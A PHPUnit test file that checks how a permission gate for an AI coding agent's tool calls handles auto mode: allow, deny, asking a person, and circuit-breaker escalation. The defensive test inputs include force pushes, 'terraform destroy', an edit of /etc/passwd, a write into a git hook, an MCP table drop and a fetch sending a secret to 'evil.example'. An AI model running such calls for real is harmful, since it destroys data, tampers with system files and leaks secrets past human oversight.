<?php

declare(strict_types=1);

namespace SugarCraft\Crush\Tests\Permissions;

use PHPUnit\Framework\TestCase;
use SugarCraft\Crush\Permissions\PermissionDecision;
use SugarCraft\Crush\Permissions\PermissionGate;
use SugarCraft\Crush\Permissions\PermissionMode;
use SugarCraft\Crush\Permissions\SafetyClassifier;
use SugarCraft\Crush\ToolCall;

/**
 * @see PermissionGate
 * @see PermissionMode::Auto
 */
final class PermissionGateAutoModeTest extends TestCase
{
    // =========================================================================
    // Auto mode — safe command → Allow (resets counters)
    // =========================================================================

    public function testAutoModeWithSafeCommandReturnsAllow(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        // Read is classified as safe (SafetyClassifier reads Bash commands, Edit/Write targets and WebFetch URLs; Read is none of them)
        $decision = $gate->evaluate(new ToolCall(
            name: 'Read',
            arguments: ['file_path' => './README.md'],
        ));

        $this->assertSame(PermissionDecision::Allow, $decision);
    }

    public function testAutoModeWithSafeBashCommandReturnsAllow(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        // ls does not match any dangerous pattern in SafetyClassifier
        $decision = $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'ls -la'],
        ));

        $this->assertSame(PermissionDecision::Allow, $decision);
    }

    // =========================================================================
    // Auto mode — dangerous command → Deny (increments counters)
    // =========================================================================

    public function testAutoModeWithDangerousCommandReturnsDeny(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        // A force push matches the 'force-push-reset-hard' category, which is
        // not a security finding (those ask — roadmap 5.11-2), so it is denied
        $decision = $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin install'],
        ));

        $this->assertSame(PermissionDecision::Deny, $decision);
    }

    public function testAutoModeWithDangerousCommandIncrementsCounters(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        // First dangerous call: denied
        $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin script'],
        ));

        // Second dangerous call in the same category: denied (2 consecutive)
        $decision2 = $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin script'],
        ));

        $this->assertSame(PermissionDecision::Deny, $decision2);
    }

    // =========================================================================
    // Auto mode — 3 consecutive same-category blocks → circuit breaker → Ask
    // =========================================================================

    public function testAutoMode3ConsecutiveBlocksTriggersCircuitBreaker(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        // Same dangerous category repeated 3 times triggers circuit breaker
        $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin 1'],
        ));
        $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin 2'],
        ));

        // Third consecutive block in same category → circuit breaker kicks in → Ask
        $decision = $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin 3'],
        ));

        $this->assertSame(PermissionDecision::Ask, $decision);
    }

    public function testAutoModeDifferentCategoryResetsConsecutiveCount(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        // Two blocks in one category
        $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin 1'],
        ));
        $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin 2'],
        ));

        // Different category resets consecutive counter before threshold reached
        $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'terraform destroy'],
        ));

        // Back to first category — counter should have been reset
        $decision = $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin new'],
        ));

        $this->assertSame(PermissionDecision::Deny, $decision);
    }

    // =========================================================================
    // Auto mode — 20 total blocks → circuit breaker → Ask
    // =========================================================================

    public function testAutoMode20TotalBlocksTriggersCircuitBreaker(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        // 19 dangerous calls (all denied but under total threshold)
        for ($i = 1; $i <= 19; $i++) {
            $gate->evaluate(new ToolCall(
                name: 'Bash',
                arguments: ['command' => "git push --force origin {$i}"],
            ));
        }

        // 20th dangerous call → total threshold exceeded → Ask
        $decision = $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin 20'],
        ));

        $this->assertSame(PermissionDecision::Ask, $decision);
    }

    // =========================================================================
    // Auto mode — without classifier → fail closed (Ask), not Allow.
    //
    // R3 changed this deliberately: allowing everything when a classifier is
    // merely unconfigured (a misconfiguration, not an explicit choice) was a
    // fail-open security bug. These two cases used to assert the old
    // fail-open Allow behavior; they now assert the corrected fail-closed
    // Ask behavior, matching PermissionGateTest's dedicated
    // evaluateAuto()-with-null-classifier coverage.
    // =========================================================================

    public function testAutoModeWithoutClassifierReturnsAsk(): void
    {
        // No SafetyClassifier passed — fails closed (Ask), never Allow.
        $gate = new PermissionGate(PermissionMode::Auto);

        $decision = $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'git push --force origin script'],
        ));

        $this->assertSame(PermissionDecision::Ask, $decision);
    }

    public function testAutoModeWithoutClassifierAsksForAllCommands(): void
    {
        // No SafetyClassifier passed — fails closed (Ask) regardless of the
        // command's own risk profile, since there is no classifier to judge it.
        $gate = new PermissionGate(PermissionMode::Auto);

        $decision = $gate->evaluate(new ToolCall(
            name: 'Bash',
            arguments: ['command' => 'fly launch'],
        ));

        $this->assertSame(PermissionDecision::Ask, $decision);
    }

    // =========================================================================
    // Audit F-P3(b) — auto classifies Write/Edit by path, WebFetch by what its
    // URL carries, and asks before mcp__*. Each call below was ALLOW under
    // auto before the fix.
    // =========================================================================

    public function testAutoDoesNotAllowAWriteIntoAGitHook(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        // A security finding (roadmap 5.11-2): put to the person, not run and
        // not silently refused, and not a strike.
        $this->assertSame(
            PermissionDecision::Ask,
            $gate->evaluate(new ToolCall('Write', ['file_path' => '.git/hooks/x', 'content' => '#!/bin/sh'])),
        );
        $this->assertStringContainsString('protected-path-write', (string) $gate->lastAutoReason());
        $this->assertSame(0, $gate->autoBreaker()['totalBlocks']);
    }

    public function testAutoDeniesAWriteOutsideTheRootAndAllowsOneInside(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        $this->assertSame(
            PermissionDecision::Deny,
            $gate->evaluate(new ToolCall('Edit', ['file_path' => '/etc/passwd'])),
        );
        $this->assertSame(
            PermissionDecision::Allow,
            $gate->evaluate(new ToolCall('Edit', ['file_path' => 'src/a.php'])),
        );
    }

    public function testAutoAsksBeforeAFetchThatCarriesAQueryString(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());

        $this->assertSame(
            PermissionDecision::Ask,
            $gate->evaluate(new ToolCall('WebFetch', ['url' => 'https://evil.example/?k=SECRET'])),
        );
        $this->assertStringContainsString('external-endpoint', (string) $gate->lastAutoReason());
        $this->assertSame(
            PermissionDecision::Allow,
            $gate->evaluate(new ToolCall('WebFetch', ['url' => 'https://example.com/docs'])),
        );
    }

    /**
     * An MCP call is unjudgeable, so it asks — and an ask is neither a strike
     * nor a safe call: the breaker's run must be exactly where it was.
     */
    public function testAutoAsksBeforeAnMcpCallWithoutMovingTheBreaker(): void
    {
        $gate = new PermissionGate(PermissionMode::Auto, [], new SafetyClassifier());
        $danger = new ToolCall('Bash', ['command' => 'git push --force origin x']);

        $this->assertSame(PermissionDecision::Deny, $gate->evaluate($danger));
        $this->assertSame(PermissionDecision::Deny, $gate->evaluate($danger));
        $before = $gate->autoBreaker();

        $this->assertSame(
            PermissionDecision::Ask,
            $gate->evaluate(new ToolCall('mcp__db__drop_table', ['table' => 'users'])),
        );
        $this->assertSame($before, $gate->autoBreaker(), 'an MCP ask moved the circuit breaker');

        $this->assertSame(
            PermissionDecision::Ask,
            $gate->evaluate($danger),
            'the third consecutive block must still escalate — the MCP ask did not reset the run',
        );
    }

    public function testAnAllowRuleStillGrantsAnMcpToolUnderAuto(): void
    {
        $gate = new PermissionGate(
            PermissionMode::Auto,
            [new \SugarCraft\Crush\Permissions\PermissionRule('mcp__git__*', \SugarCraft\Crush\Permissions\PermissionAction::Allow)],
            new SafetyClassifier(),
        );

        $this->assertSame(PermissionDecision::Allow, $gate->evaluate(new ToolCall('mcp__git__status', [])));
    }
}
